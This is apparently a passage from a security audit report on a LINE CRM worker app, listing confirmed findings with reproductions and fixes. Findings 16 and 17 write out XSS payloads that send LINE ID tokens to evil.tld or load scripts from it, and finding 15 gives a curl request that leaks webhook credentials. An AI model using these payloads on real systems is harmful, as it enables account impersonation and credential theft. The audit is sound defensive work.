**内容**: GET /api/forms/:id は auth.ts:179 で無認証公開だが、serializeForm（forms.ts:24-51）は LIFF レンダリングに不要な `onSubmitWebhookUrl`（37 行）と `onSubmitWebhookHeaders`（38 行）、および `onSubmitScenarioId`/`onSubmitTagId`/`onSubmitMessageContent` まで返す。on_submit_webhook_headers には送信先 API の認証ヘッダ（Bearer トークン・API キー等）が入る運用が一般的で、これが誰でも読める。LIFF のフォーム描画に必要なのは fields/name/description/OG のみ。

**失敗シナリオ**: 攻撃者が `GET /api/forms/<formId>`（無認証）を叩くと、レスポンスに `onSubmitWebhookHeaders`（例: `{"Authorization":"Bearer <連携先APIキー>"}`）と `onSubmitWebhookUrl` がそのまま含まれ、そのアカウントの外部連携資格情報と内部オートメーション構成（発火シナリオ/タグ）が窃取される。複数アカウントのフォーム構成が同様に公開されるため、across-account でのシークレット・設定漏洩になる。

**悪用可能性/再現条件**: Reproduce: obtain a form UUID (from any LIFF form link sent to friends, a tracked-link/broadcast message, or the client's GET /api/forms/:id request), then send an unauthenticated request: `curl https://<worker-host>/api/forms/<formUUID>` (no Authorization header, no cookie). The JSON response includes onSubmitWebhookUrl, onSubmitWebhookHeaders (e.g. {"Authorization":"Bearer <downstream-API-key>"}), and internal automation config (onSubmitScenarioId/onSubmitTagId/onSubmitMessageContent). Preconditions: (1) attacker knows the form UUID — not brute-forceable but broadly distributed to all of the account's leads/friends and observable by anyone who receives or intercepts a form link; (2) the leaked credential only exists if an operator stored an auth header in on_submit_webhook_headers, which is the natural/documented use of that field for server-side submit webhooks (callFormWebhook merges it into the outbound request). Because forms are not tenant-scoped, the same public route exposes every account's form by UUID, so it is a cross-account disclosure surface.

**推奨対応**: 公開 GET 用に fields/name/description/og_* だけを返す最小シリアライザを用意し、on_submit_* / webhook_url / webhook_headers を除外する。管理画面（認証済み）向けにのみフル serializeForm を返す。

<details><summary>検証者の根拠</summary>

The finding is accurate on every load-bearing point, though the file path in the report is slightly off (it is apps/worker/src/middleware/auth.ts:179, not apps/worker/src/routes/auth.ts).

1. Public, unauthenticated: authMiddleware (middleware/auth.ts:153-184) returns next() with no staff/token/LIFF/CSRF check for any path matching /^\/api\/forms\/[^/]+$/ (line 179, comment "GET form definition (public for LIFF)"). The handler forms.get('/api/forms/:id') (routes/forms.ts:84-96) then returns serializeForm(form) with no field filtering.

2. Secret fields are returned: serializeForm (routes/forms.ts:24-51) emits onSubmitWebhookUrl (37), onSubmitWebhookHeaders (38), plus onSubmitScenarioId/onSubmitTagId/onSubmitMessageContent (33,34,36).

3. on_submit_webhook_headers genuinely carries downstream auth: callFormWebhook (routes/forms.ts:649-655) JSON-parses this column and merges it into the outbound fetch headers — exactly where a Bearer token / API key belongs. The DB layer (packages/db/src/forms.ts:16) stores it as an arbitrary header blob. So an operator configuring an authenticated submit-webhook would naturally place a secret there, and it becomes world-readable via the public GET.

4. Forms are not tenant-scoped: the forms table has no line_account_id column and getFormById (packages/db/src/forms.ts:103-108) is a bare SELECT * FROM forms WHERE id = ?. All tenants share this one public route, matching the "across-account" framing.

I attempted to reject via three angles and all failed: (a) no secondary auth/LIFF guard exists on this GET; (b) no output allowlist trims the serializer; (c) no tenant filter constrains getFormById.

Two honest exploitability caveats keep this from being a trivially-remote leak but do not overturn it: the attacker needs the form UUID (crypto.randomUUID, not brute-forceable) — however that UUID is embedded in every LIFF form link distributed to the account's friends/leads and is even echoed client-side (client/form.ts:865-867, 1173), so it is a public identifier, not a credential; and the header leak only yields a secret if an operator actually stored one, which is the normal use of webhook auth headers. Because the endpoint is fully unauthenticated and the exposed field is designed to hold integration credentials, this is a real credential/configuration disclosure.

Side note (out of scope but corroborating): the line-179 regex is method-agnostic, so PUT/DELETE /api/forms/:id are also unauthenticated — an even more severe adjacent issue.

</details>

### 16. [🟠 HIGH] escapeHtml() does not escape quotes, but is used inside double-quoted HTML attributes → attribute-breakout XSS

- **観点**: 横断(設定/フロント) / `x-web-frontend` ・ **判定**: `CONFIRMED` ・ 分類: xss
- **場所**: `apps/worker/src/client/form.ts:83`

**内容**: escapeHtml() (form.ts:83-87, duplicated verbatim at main.ts:97 and booking.ts:54) escapes only via textContent→innerHTML, which neutralizes &,<,> but NOT the double/single quote characters. This helper is then interpolated inside double-quoted attribute values throughout the LIFF form renderer: placeholder="${escapeHtml(field.placeholder)}" (107,123), name/id="...${escapeHtml(field.name)}" (120-121), <option value="${escapeHtml(o)}"> (149), radio/checkbox value="${escapeHtml(o)}" (166,180), type="${escapeHtml(field.type)}" (191), and the X-suggestion avatar <img src="${escapeHtml(s.profileImageUrl)}"> (1066). Because a literal double-quote survives escaping, a value can close the attribute early and append an event-handler attribute to the existing element (tag injection via < is blocked, but attribute injection is not). The form field metadata (label/placeholder/name/options) comes from the form definition returned by GET /api/forms/:id, i.e. it is authored in the admin form editor; the resulting markup is rendered in the public LIFF page where liff.getIDToken()/getProfile() (LINE identity/session tokens) are available to script.

**失敗シナリオ**: A staff user creates/edits a form and sets a text field's placeholder to: x" autofocus onfocus="fetch('https://evil.tld/e?t='+encodeURIComponent(liff.getIDToken()))  . renderField emits <input ... placeholder="x" autofocus onfocus="fetch(...liff.getIDToken()...)" ...>. Every LINE friend who opens that form auto-focuses the input, the injected onfocus fires, and the victim's LINE ID token is exfiltrated to the attacker, enabling impersonation against the worker's LIFF endpoints. No < or > is needed, so the existing escaping does not stop it.

**悪用可能性/再現条件**: Reproduction: create or edit a form so a text field's placeholder (or name/label/option/type) contains a double quote and an event handler, e.g. placeholder = x" autofocus onfocus="fetch('https://evil.tld/e?t='+encodeURIComponent(liff.getIDToken())) . renderField() emits <input ... placeholder="x" autofocus onfocus="fetch(...liff.getIDToken()...)" ...> via innerHTML; the onfocus listener becomes active. Every LINE friend opening the form (public LIFF ?page=form&id=FORM_ID) focuses/taps the input (a form field they are meant to fill), the handler fires, and the LINE ID token is exfiltrated, enabling impersonation against the worker's /api/liff endpoints; full arbitrary JS is available in the LIFF origin. Conditions that make it near-certain: (1) no server-side validation of field JSON, (2) no CSP header anywhere in the worker, (3) GET /api/forms/:id is public. Amplifier: auth.ts:179 path-only bypass means PUT /api/forms/:id also skips auth and its handler has no staff check, so injection is possible even unauthenticated given a known form id (ids are exposed in public LIFF URLs). Only < / > tag injection is blocked; attribute-breakout event-handler injection is not.

**推奨対応**: Make escapeHtml also replace double-quote to &quot; and single-quote to &#39; (escaping & first), or build DOM nodes via document.createElement + setAttribute/textContent instead of innerHTML string concatenation. Apply the fix to all three copies (form.ts:83, main.ts:97, booking.ts:54), and validate attribute-context values such as field.type against the known enum.

<details><summary>検証者の根拠</summary>

The core claim is factually correct and exploitable. apps/worker/src/client/form.ts:83-87 escapeHtml() uses the textContent→innerHTML idiom, whose text-node serialization escapes only &, <, > — never the double/single quote. It is interpolated inside double-quoted HTML attributes throughout renderField(): placeholder= (107,123), name/id= (120-121,140-141,152-153,192-193), option value= (149), radio/checkbox value= (166,180), type= (191), and img src= (1066), all emitted via app.innerHTML (394,500). A literal " in a field value closes the attribute and appends event-handler attributes to the live element; inline handlers created via innerHTML parsing DO fire (unlike <script>, and < is escaped so tag injection is separately blocked). The LIFF page exposes liff.getIDToken()/getProfile() (declared 13-21, token POSTed to /api/liff/link at 1186), enabling ID-token exfiltration and arbitrary JS for every LINE friend who opens the form. Reachability is fully open: field metadata is persisted with no validation (JSON.stringify at forms.ts:125,172) and returned raw by GET /api/forms/:id (84-96); there is NO Content-Security-Policy anywhere in the worker, so nothing blocks inline handlers or the exfil fetch. The helper is duplicated verbatim at main.ts:97 and booking.ts:54 as claimed (the liff.ts:1741 server variant, by contrast, correctly escapes quotes). I attempted to find a neutralizing guard (server-side sanitization, field.type allowlist, CSP, type narrowing at the call site) and found none. If anything the finding understates the surface: auth.ts:179 bypasses authentication for /api/forms/:id on ALL methods (not just GET), and the PUT handler (forms.ts:147-197) has no internal staff check, so even an unauthenticated actor who knows a form id — form ids appear in public LIFF ?id= URLs — can inject the payload.

</details>

### 17. [🟠 HIGH] Unvalidated ?xh / ?gate params redirect the credentialed X-Harness fetch to an attacker origin (webhook-secret exfiltration + attacker-controlled DOM)

- **観点**: 横断(設定/フロント) / `x-web-frontend` ・ **判定**: `CONFIRMED` ・ 分類: ssrf-credential-leak
- **場所**: `apps/worker/src/client/form.ts:1232`

**内容**: state.xHarnessBaseUrl is taken verbatim from the ?xh URL query param with no validation (form.ts:1232-1234; only a trailing slash is stripped), and the engagement-gate id is taken from ?gate (855-856). attachXAutocomplete then issues credentialed requests to `${state.xHarnessBaseUrl}/api/engagement-gates/${gate}/repliers` (876) and `.../verify` (1019-1020), attaching headers from getWebhookHeaders() (863-871), which parses state.formDef.onSubmitWebhookHeaders. That header blob is the form's webhook auth config and is returned in full to any unauthenticated caller by the public GET /api/forms/:id (routes/forms.ts:38, serializeForm returns onSubmitWebhookHeaders: row.on_submit_webhook_headers). So an attacker who crafts a form URL controls where these headers (typically an Authorization/API key for the X-Harness engagement-gate service) are sent. The same response's profileImageUrl is then rendered into src="..." (1066) where, combined with the quote-unsafe escapeHtml, the attacker-controlled response can also inject an onerror handler (reflected XSS).

**失敗シナリオ**: Attacker sends a victim a link to a legitimate active form with an X field: /liff?page=form&id=<realFormId>&xh=https://evil.tld&gate=g . On form load the client prefetches https://evil.tld/api/engagement-gates/g/repliers with the form's webhook Authorization header attached — the secret API key is delivered straight to evil.tld. evil.tld additionally returns a replier whose profileImageUrl is  x" onerror="import(`https://evil.tld/x.js`)  ; when a matching suggestion renders, the onerror fires in the LIFF origin.

**悪用可能性/再現条件**: Preconditions: (a) a real, active form that includes an x_username field (renders .x-autocomplete-input) — the harness's X engagement-gate feature; (b) victim opens a crafted LIFF URL the attacker sends over LINE, e.g. /liff?page=form&id=<realFormId>&xh=https://evil.tld&gate=g (xh/gate are designed passthrough params). Steps: on form load the client prefetches https://evil.tld/api/engagement-gates/g/repliers with the form's webhook headers attached (harmless-ish, since those headers are also public via GET /api/forms/:id). evil.tld returns a replier pool where at least one replier has profileImageUrl = `x" onerror="fetch('https://evil.tld/e?t='+liff.getIDToken())` and a displayName set to a de Bruijn sequence over [a-z0-9] so any 3+ char string the victim types matches. When the victim types their X handle (the intended action), showSuggestions renders the <img>, the malformed src fails, onerror fires, and arbitrary JS runs in the LIFF web origin — no CSP blocks it. Result: theft of LINE ID token/profile, form submission as the victim, arbitrary DOM control. Reliability is high due to the de Bruijn matching trick; main gating factor is social-engineering the victim into opening the crafted link and typing >=3 chars.

**推奨対応**: Do not derive the X-Harness base URL from a client query param. Resolve it server-side from the trusted form/webhook config, or validate ?xh against a strict allowlist of known X-Harness hosts before any fetch. Never send onSubmitWebhookHeaders to an origin other than the exact configured webhook host. Separately, stop returning on_submit_webhook_headers to the unauthenticated GET /api/forms/:id (routes/forms.ts:38).

<details><summary>検証者の根拠</summary>

The full exploit chain is real and reachable in current code.

(1) form.ts:1231-1234 assigns state.xHarnessBaseUrl directly from the ?xh query param with no origin validation (only a trailing slash is stripped). ?gate is likewise taken verbatim (getGateId, 854-856). index.ts:312-314 even forwards xh/gate through the /r/:ref redirect, and the client reads window.location.search directly, so the values are unconditionally attacker-controllable.

(2) On form load, attachXAutocomplete issues a credentialed fetch to `${state.xHarnessBaseUrl}/api/engagement-gates/${gate}/repliers` with headers from getWebhookHeaders() (875-878), and the same for /verify (1019-1020). getWebhookHeaders() parses state.formDef.onSubmitWebhookHeaders (863-871) — the form's webhook auth headers. So a crafted ?xh sends those headers to an attacker origin. NOTE: this "secret exfiltration" is largely redundant because auth.ts:179 explicitly makes GET /api/forms/:id public and forms.ts:38/91 returns onSubmitWebhookHeaders in full to any anonymous caller — the attacker can already read the headers directly. That is arguably a separate exposure issue, not new capability from the redirect.

(3) The impactful half is confirmed reflected XSS. escapeHtml (83-87) uses textContent->innerHTML, which does NOT escape double quotes. In showSuggestions the attacker-controlled profileImageUrl is placed in src="${escapeHtml(...)}" (1066), so a value like `x" onerror="..."` breaks out of the attribute. The attacker fully controls the /repliers response (evil.tld), which populates replierPool (881); it is filtered on the victim's typed query (>=3 chars) and rendered via showSuggestions (1105-1109). A single replier whose displayName is a de Bruijn sequence over [a-z0-9] (order 3, ~46KB) matches any 3-char substring the victim types, making the render effectively guaranteed. No CSP is set anywhere (worker source or apps/worker/index.html lacks any Content-Security-Policy), so the injected onerror handler / dynamic import() executes in the LIFF origin, exposing liff.getIDToken(), profile, friendId, and enabling form submission on the victim's behalf.

The finding is substantively accurate; only the emphasis on webhook-secret exfiltration is overstated (already public). The XSS + credentialed-fetch-to-arbitrary-origin is genuine and exploitable.

</details>

## 🟡 MEDIUM

### 18. GET /api/friends: limit/offset は無検証 — 負値で SQLite 無制限 → 全件走査 + getFriendTags の N+1
- `bug-core-routes` ・ 判定 `CONFIRMED` ・ `apps/worker/src/routes/friends.ts:85`
- **内容**: `const limit = Number(c.req.query('limit') ?? '50')` / `offset`(85-86行) はクランプも isFinite ガイドも無く、そのまま `LIMIT ? OFFSET ?` に bind される(227/232/234行)。負値の LIMIT は SQLite で『無制限』になる(同リポの chats.ts:228 が自らこの挙動に依存)。無制限で返った全 friend に対し includeTags 既定 true のため `Promise.all(items.map(getFriendTags))`(240-247行)が friend 数ぶんの D1 クエリ(packages/db/src/tags.ts:81 は 1 friend=1 クエリ)を撃つ N+1 になる。`?limit=abc` は Number→NaN が bind され D1 が NaN bind を拒否して 500。`?limit=0` は `Math.floor(offset/0)`→page が NaN(337行)。
- **失敗シナリオ**: 10k friend の本番で `GET /api/friends?limit=-1` を叩く → LIMIT -1 で全 friend が返り、続けて getFriendTags を約1万回発行 → Workers のサブリクエスト上限/CPU で timeout・500、共有 D1 に高負荷が波及し他テナントにも影響。`?limit=xyz` は即 500。
- **推奨**: limit/offset を整数パースし範囲クランプする(例: `const limit = Math.min(200, Math.max(1, Number.parseInt(q,10) || 50))`, offset は `Math.max(0, ...)`)。chats.ts の `Number.parseInt`+`Number.isFinite` ガードと同じ方式に揃える。

### 19. GET /api/conversations: limit/offset/minHoursSince/maxHoursSince が無検証 — NaN で 500・負 limit で無制限
- `bug-core-routes` ・ 判定 `CONFIRMED` ・ `apps/worker/src/routes/conversations.ts:14`
- **内容**: 11-15行の `Number(...)` 群はいずれも下限ガード無し。`limit = Math.min(Number(...), 200)` は上限のみで負値を通し、負の LIMIT は SQLite 無制限。無制限で friendIds が 100 を超えるとタグ引き(137-142行)の `IN (${placeholders})` が D1 の bind 変数上限(unanswered-inbox.ts のコメントが明記する 100)を越えて 500。また `?limit=abc`/`?minHoursSince=abc`/`?maxHoursSince=abc` は NaN が bind され D1 が拒否して 500(minHoursSince は 85/121行の `>= ?` に NaN)。
- **失敗シナリオ**: `GET /api/conversations?minHoursSince=abc` → NaN bind で即 500。`?limit=-1` の DB に 100件超の要対応会話があれば、タグ IN 句の変数超過で 500。
- **推奨**: 各数値を整数パース+範囲クランプ(minHoursSince/offset は 0 以上、limit は 1..200)。NaN は既定値へフォールバック。

### 20. リマインダ配信に送信前の排他ロックが無く、6時間ごとの cron 重複起動で全 due ステップが二重送信される
- `bug-delivery-cron` ・ 判定 `CONFIRMED` ・ `apps/worker/src/services/reminder-delivery.ts:52`
- **内容**: processReminderDeliveries は getDueReminderDeliveries (friend_reminder_deliveries に未記録かつ時刻到来のステップを返す) → pushMessage → INSERT OR IGNORE で配信済みマーク、という send-then-mark 方式で、送信前の atomic claim が無い。step-delivery が claimFriendScenarioForDelivery で保護されているのと非対称。wrangler.toml:32 の crons=['*/5 * * * *','0 */6 * * *'] は 00:00/06:00/12:00/18:00 で両 cron が同時発火し scheduled() が2並列で走る。2つの invocation が同一 due ステップを『未配信』と読み、両方が pushMessage を実行してから片方だけが INSERT に成功する(もう片方は OR IGNORE)。
- **失敗シナリオ**: 12:00 ちょうどに */5 と 0 */6 の両 cron が発火。両 invocation の getDueReminderDeliveries が同じ friend_reminder の同じステップ(まだ friend_reminder_deliveries に行なし)を返す。両方が deliveryClient.pushMessage を呼び、ユーザーは同一リマインダを2通受信。1日4回の重複窓で発生。
- **推奨**: 送信前に INSERT OR IGNORE INTO friend_reminder_deliveries を先行実行し meta.changes>0 のときだけ pushMessage する(claim-before-send)。または UPDATE ... WHERE で friend_reminder 単位の delivering ロックを取る。少なくとも 0 */6 の tick では配信系を二重起動させない(event.cron で配信ジョブをガードする)。

### 21. MAX_SENDS_PER_CRON=40 が『subrequest 50 上限』の前提と矛盾し、1配信あたり約10前後の subrequest を消費して invocation 全体の subrequest 予算を枯渇させ得る
- `bug-delivery-cron` ・ 判定 `CONFIRMED` ・ `apps/worker/src/services/step-delivery.ts:100`
- **内容**: MAX_SENDS_PER_CRON=40 のコメントは『CF Free plan: 50 subrequests limit (margin for other jobs)』とするが、processSingleDelivery 1件は claimFriendScenarioForDelivery / getFriendById / delivery_mode SELECT / getScenarioSteps / (evaluateCondition) / resolveMetadata(getMergedMetadataByUserId) / resolveStepContent / autoTrackContent(resolveTrackedLinkBaseUrl+createTrackedLink) / appendFriendToTrackedLinks(resolveTrackedLinkBaseUrl) / getLineAccountById / pushMessage / messages_log INSERT / advanceFriendScenario / addTagToFriend と概ね10〜15 subrequest を発行する。40 送信で約400〜600 subrequest となり『50 以内』は成立しない。scheduled() は step 配信・scheduled/queued broadcast・reminder・insight を1 invocation 内で並列実行し 1000 subrequest 上限を共有するため、合算で上限に達すると以降の fetch/DB 呼び出しが例外化し、pushMessage 途中中断による送信欠落や 'delivering' 残留(5分後 recover→再送)を招く。
- **失敗シナリオ**: 1 tick で step 配信40件(約500 subrequest)+ 20 バッチのタグ配信(約80)+ reminder 数十件 + insight fetch が同一 invocation で重なり subrequest 累計が 1000 を超過。処理中の pushMessage / db.batch が 'Too many subrequests' で失敗し、一部友だちへ未配信のまま claim 済み行が 'delivering' で残る。
- **推奨**: MAX_SENDS_PER_CRON を実 subrequest 数(1件≈10〜15)に基づいて算定し直す(例: 予算200 subrequest なら15前後)。コメントの『50 上限』記述を実測に合わせて修正。理想的には scheduled() 全ジョブで共有する subrequest 予算を明示的に配分し、各ジョブが上限手前で打ち切る仕組みにする。

### 22. セグメント配信は is_following フィルタを持たず、unfollow 済み(is_following=0)の友だちにも送信・ログ記録される
- `bug-delivery-cron` ・ 判定 `CONFIRMED` ・ `apps/worker/src/services/segment-query.ts:96`
- **内容**: buildSegmentQuery は `SELECT f.id, f.line_user_id FROM friends f WHERE <clauses>` を生成するのみで、既定の is_following=1 制約が無い。タグ配信経路 (broadcast.ts:348-349) は getFriendsByTag の結果を .filter(f=>f.is_following) で絞るが、segment_conditions 経路 (broadcast.ts:333-345) はこの SQL をそのまま使うため is_following ルールを明示しない限りブロック/ブロック解除待ちの友だちも対象になる。multicast は無効宛先を課金対象として消費し、messages_log には送信済みとして記録される。
- **失敗シナリオ**: operator=AND, rules=[tag_exists(タグX)] のセグメント配信を実行。タグXを持つが既に is_following=0 の友だち500人も対象に含まれ、messages_log に outgoing として記録される。実際には届かないメッセージが送信数・成功数を水増しし、月間メッセージ枠を無駄に消費する。
- **推奨**: buildSegmentQuery の生成 SQL に `f.is_following = 1 AND (...)` を常時付与する(ユーザーが is_following ルールを明示した場合はそれと AND で共存)。既存の is_following ルール指定との重複は許容できる。

### 23. Auto-reply matching is first-win by created_at only; a broad 'contains' rule shadows a later specific 'exact' rule
- `bug-crm-automation` ・ 判定 `CONFIRMED` ・ `apps/worker/src/routes/webhook.ts:606`
- **内容**: In the message_received handler, auto_replies are fetched `ORDER BY created_at ASC` (webhook.ts:606) and the loop breaks on the first match (webhook.ts:666), with no precedence for exact over contains or for longer/more-specific keywords. Match specificity is ignored; only insertion order decides the winner.
- **失敗シナリオ**: Rule A created first: keyword='予約', match_type='contains'. Rule B created later: keyword='予約キャンセル', match_type='exact'. Friend sends '予約キャンセル'. The loop hits Rule A first (text.includes('予約') is true), replies with the generic booking message and breaks, so the cancel-specific reply B never runs. The friend receives the wrong automated answer.
- **推奨**: Sort candidates by specificity before first-win selection: prefer match_type='exact' over 'contains', then longer keyword first, then created_at. Alternatively evaluate exact matches in a first pass and contains matches only if no exact match was found.

### 24. Scenario step onReachTag adds tag directly, bypassing tag_added enrollment and tag_change automations/scoring (side-effect fan-out gap)
- `bug-crm-automation` ・ 判定 `CONFIRMED` ・ `apps/worker/src/services/step-delivery.ts:283`
- **内容**: When a scenario step reaches its on_reach_tag_id, step-delivery.ts:283 calls addTagToFriend directly (no fireEvent). This is inconsistent with the manual route (friends.ts:449) and the booking/auto path (friend-tag-attach.ts:45), both of which fire tag_change and enroll tag_added scenarios. A tag applied by a scenario step therefore silently skips tag_added scenario enrollment, tag_change automations, scoring, and outgoing webhooks.
- **失敗シナリオ**: A scenario step tags a friend 'hot-lead' via on_reach_tag_id. A separate scenario has trigger_type='tag_added', trigger_tag_id='hot-lead', and an automation on tag_change sends a follow-up. Because step-delivery uses addTagToFriend directly, neither the tag_added scenario nor the tag_change automation ever fires — the downstream funnel the operator wired up never triggers for scenario-applied tags.
- **推奨**: Route scenario on-reach tagging through attachTagAndFireSideEffects so it fires tag_change and enrolls tag_added scenarios like every other tag-add path (its changes>0 guard already prevents duplicate fan-out and re-entrancy loops).

### 25. アフィリ全体レポートが affiliate_id OR affiliate_code で1CVを別々の2アフィリに二重計上
- `bug-attribution` ・ 判定 `CONFIRMED` ・ `packages/db/src/affiliates.ts:326`
- **内容**: getAffiliateReport の totalConversions(326行)と totalRevenue(329行)は `WHERE (ce.affiliate_id = a.id OR ce.affiliate_code = a.code)` で集計する。affiliate_id はサーバ側 last-touch 解決値(trackConversion→resolveAffiliateAttribution, conversions.ts:98,117)、affiliate_code はクライアント供給値(routes/conversions.ts:107, conversions.ts:108-115)で、両者が別アフィリを指しうる。その場合、同一 conversion_events 行が『affiliate_id で一致するアフィリA』と『affiliate_code で一致するアフィリB』の両方の行で1件ずつカウント/収益加算され、affiliate をまたいだ二重計上になる。estimatedCommission もこの値から算出されるため過払いにつながる。単一アフィリ詳細の getAffiliateReportV2 は `ce.affiliate_id = ?` のみ(affiliate-report.ts:191)で、リスト集計と詳細集計が食い違う。227行のコメントは『at most once per affiliate』とするが、affiliate 間の重複は防げていない。
- **失敗シナリオ**: 友だちFのCVを追跡。Fの last-touch ref はアフィリA(→affiliate_id=A)。同じ track 呼び出しで affiliateCode='CODEB'(アフィリBのコード)を渡す。GET /api/affiliates-report では当該1CVがAの total_conversions/total_revenue と、Bの total_conversions/total_revenue の両方に計上され、AとB双方に成果・報酬が立つ。
- **推奨**: レポートの帰属ロジックを1経路に統一する(ASP は affiliate_id 一本に寄せ、legacy affiliate_code は affiliate_id が NULL の行に限って fallback 適用する等)。例: `WHERE ce.affiliate_id = a.id OR (ce.affiliate_id IS NULL AND ce.affiliate_code = a.code)`。V2 と同一述語に揃え、二経路が同一行を二重に拾わないようにする。

### 26. 自動広告CVポストバック経路が発火しない(conversionEventName を誰も設定しない死んだゲート)
- `bug-attribution` ・ 判定 `CONFIRMED` ・ `apps/worker/src/services/event-bus.ts:56`
- **内容**: fireEvent は `if (payload.friendId && payload.conversionEventName)` の時のみ sendAdConversions を呼ぶ(56-59行)。しかしリポジトリ全体を grep しても conversionEventName / conversionValue は event-bus.ts の宣言・参照以外に一切セットされない。webhook friend_add / message_received、friends の tag_change、stripe.ts:149 の cv_fire など全 fireEvent 呼び出しは conversionEventName を渡さないため、実CV発生時に Meta/Google/X/TikTok への オフラインCV送信は永遠に起きない。唯一の実経路は手動テスト用 /api/ad-platforms/test(routes/ad-platforms.ts:145)のみ。広告媒体の最適化・計測が実CV信号を受け取れず、広告費の最適化が壊れる。
- **失敗シナリオ**: Meta広告(fbclid が ref_tracking に記録済み)経由の友だちが後日 Stripe 決済→fireEvent('cv_fire', {friendId, eventData:{type:'purchase', amount}}) が conversionEventName 無しで発火→sendAdConversions は呼ばれず、Meta CAPI に購入CVが送られない。
- **推奨**: cv_fire 等のCV系 fireEvent 呼び出し元で payload.conversionEventName(と conversionValue)を実際に設定するか、event-bus 側で eventType==='cv_fire' 等から conversionEventName を導出する。少なくとも意図した発火経路の統合テストを追加する。

### 27. 報酬テンプレがクライアント供給 ref で解決され、所有者/アカウント適格性を検証しない(他キャンペーン混線)
- `bug-attribution` ・ 判定 `CONFIRMED` ・ `apps/worker/src/services/reward-resolver.ts:40`
- **内容**: resolveRewardTemplate は requestedTrackedLinkId が実在 tracked_link に解決すればその reward_template を無条件で採用する(40-46行)。この値は公開エンドポイント /api/forms/:id/submit の body.trackedLinkId(routes/forms.ts:426)で、元はフォームURLの client 制御 `?ref=` パラメータ(client/form.ts:1245)。getTrackedLinkById は line_account でスコープされず(tracked-links.ts:41)、『その友だちが実際にそのリンクを踏んだか』『同一アカウントか』の検証も無い。forms.ts:414-417 は anti-replay を意図的に無効化と明記するが、リンク所有権/適格性チェックは別問題で未対応。結果、友だちは任意キャンペーン(別アカウント含む)の tracked-link UUID を ref に指定して、その報酬テンプレを受け取れる。
- **失敗シナリオ**: アカウントAの友だちが、アカウントBの高額報酬 tracked-link の UUID を知り、公開フォームを `?ref=<BのUUID>` で開いて送信→buildRewardMessage(forms.ts:583)がBの reward_template を当該友だちに push。本来Bのキャンペーン報酬が混線して漏れる。
- **推奨**: requestedTrackedLinkId 解決時に、リンクの line_account_id が friend の line_account_id と一致すること、および当該 friend の link_clicks / ref_tracking に実クリック実績があることを検証する。適格でなければ null を返して first-touch/フォーム既定へフォールバックする。

### 28. schema.sql references traffic_pools but never defines it — pnpm db:migrate applies schema.sql alone and yields a broken DB
- `bug-db-migrations` ・ 判定 `CONFIRMED` ・ `/home/shinohara/.line-harness/packages/db/schema.sql:725`
- **内容**: schema.sql is treated as a standalone, re-appliable base schema: root package.json exposes "db:migrate": "wrangler d1 execute your-database --file=packages/db/schema.sql" and "db:migrate:local" (package.json:12-13), and the in-file comment at schema.sql:519-522 documents db:migrate as the differential-apply path. But schema.sql is NOT self-consistent or complete. pool_accounts (schema.sql:723-730) declares pool_id TEXT NOT NULL REFERENCES traffic_pools(id) ON DELETE CASCADE, yet there is no CREATE TABLE traffic_pools anywhere in schema.sql (grep confirms only the reference on line 725; the table is created only by migrations/016_traffic_pools.sql). schema.sql is additionally missing ~13 other tables that only exist via migrations (entry_routes, ref_tracking, forms, form_submissions, form_opens, tracked_links, link_clicks, events, event_slots, event_bookings, event_booking_*, update_history) and 4 friends columns (ref_code, metadata, line_account_id, first_tracked_link_id — added by migrations 003/004/008/022). The production installer (create-line-harness/src/steps/database.ts) masks this because a freshly-created DB uses bootstrap.sql (complete) and the fallback path applies schema.sql THEN all migrations (016 then creates traffic_pools). Only the schema.sql-alone path breaks.
- **失敗シナリオ**: A developer runs `pnpm db:migrate:local` (or db:migrate) against a fresh/empty D1 to set up a dev database. schema.sql applies without error (SQLite does not verify FK parent existence at CREATE time), producing a DB where traffic_pools/entry_routes/forms/tracked_links/events/ref_tracking/update_history do not exist and pool_accounts has a dangling FK. With PRAGMA foreign_keys=ON, any INSERT into pool_accounts fails with 'no such table: main.traffic_pools'; every traffic-pool, entry-route, form, tracked-link, and event feature is broken, and SELECT f.* on friends returns rows without metadata/line_account_id (app code doing JSON.parse(friend.metadata) throws).
- **推奨**: Make schema.sql a complete, self-consistent snapshot: add the missing CREATE TABLE traffic_pools (before pool_accounts) and the other ~13 missing tables and 4 friends columns, OR stop shipping schema.sql as an apply target — repoint db:migrate/db:migrate:local at bootstrap.sql (the generated complete snapshot) and keep schema.sql only as the generator input. Add a CI check that schema.sql applied alone produces the same table set as bootstrap.sql.

### 29. Google Calendar 連携の /book に重複・空き検証が皆無で二重予約と GCal イベント二重作成が起きる
- `bug-booking-events` ・ 判定 `CONFIRMED` ・ `apps/worker/src/routes/calendar.ts:175`
- **内容**: POST /api/integrations/google-calendar/book は createCalendarBooking(packages/db/src/calendar.ts:78)を無条件 INSERT で呼ぶだけで、既存予約との重複チェックも容量チェックも一切ない。slots エンドポイント(69行)の空き計算はあくまで表示用で、book 時に再検証されない(TOCTOU)。加えて Google Calendar にもイベントを作成する。
- **失敗シナリオ**: 同一時間帯に対し 2 回(同時でも逐次でも)book を呼ぶと両方成功し、calendar_bookings に重複行が作られ、Google Calendar 上にも同時刻イベントが 2 件作成される。オペレータが画面を更新せず再予約するだけでも発生。
- **推奨**: book 時にサーバ側で当該 connection・時間帯の既存 active 予約と重複判定を行い、衝突時は 409。可能なら salon 予約の `INSERT ... SELECT WHERE NOT EXISTS` のように容量/重複判定を単一ステートメントで原子化する。

### 30. 全テナントの channel secret / access token / OAuth refresh token が D1 に平文保管
- `pii-at-rest` ・ 判定 `CONFIRMED` ・ `packages/db/schema.sql:245`
- **内容**: line_accounts.channel_access_token / channel_secret (schema.sql:245-246), google_calendar_connections.access_token / refresh_token / api_key (382-392), incoming/outgoing_webhooks.secret (363,373), staff_members.api_key (703) がすべて TEXT の平文で単一 D1 に格納されている。書き込み経路 (apps/worker/src/routes/line-accounts.ts:296-307 createLineAccount, updateLineAccount) もアプリ側で暗号化・封筒化せず body の生値をそのまま INSERT/UPDATE している。CLAUDE 記載のとおり単一 D1 に全 line_accounts(テナント) が相乗りしているため、平文シークレットの集約 blast radius が大きい。
- **失敗シナリオ**: D1 のバックアップエクスポート漏洩・SQL インジェクション・運用者/委託先の DB 直接参照のいずれかが起きた瞬間、全アカウントの channel_access_token(=そのLINE公式アカウントとしてのpush送信・友だち情報取得が可能なベアラ資格) と Google の refresh_token がそのまま悪用可能になる。ローテーション以外に無害化手段がない。
